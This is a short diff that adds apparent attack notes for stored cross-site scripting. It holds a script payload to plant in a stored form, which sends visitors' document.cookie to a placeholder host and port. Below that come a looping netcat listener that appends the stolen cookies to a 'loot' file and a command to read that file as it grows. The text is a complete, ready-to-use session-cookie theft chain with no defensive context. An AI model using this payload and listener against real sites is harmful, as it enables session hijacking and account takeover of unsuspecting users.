@@ -1,0 +1,8 @@
+Inject code into stored form
+<script>const Http = new XMLHttpRequest();const url='<HOSTNAME>:<PORT>/'+document.cookie;Http.open("GET",url);Http.send();</script>
+
+Create listener on server
+while true; do nc -l -p <PORT> >> loot.txt; done &
+
+Readout
+tail -f loot.txt
